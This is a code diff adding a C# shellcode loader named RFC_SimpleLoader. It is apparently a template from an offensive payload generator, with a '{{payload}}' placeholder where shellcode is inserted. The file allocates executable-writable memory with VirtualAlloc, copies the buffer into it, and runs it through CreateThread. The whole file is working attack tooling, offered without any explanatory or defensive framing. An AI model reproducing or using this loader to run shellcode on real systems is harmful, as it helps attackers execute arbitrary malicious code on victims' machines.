@@ -1,0 +1,33 @@
+using System;
+using System.Runtime.InteropServices;
+
+namespace RFC_SimpleLoader
+{
+    internal class Program
+    {
+        #region Win32
+
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        #endregion
+        static void Main(string[] args)
+        {
+            // x64
+            {{payload}}
+
+            IntPtr pMem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+            Console.WriteLine($"[+] Memory allocated at: 0x{pMem.ToString("X")}");
+            Marshal.Copy(buf, 0, pMem, buf.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, pMem, IntPtr.Zero, 0, IntPtr.Zero);
+            Console.WriteLine($"[+] Thread created at: 0x{hThread.ToString("X")}");
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
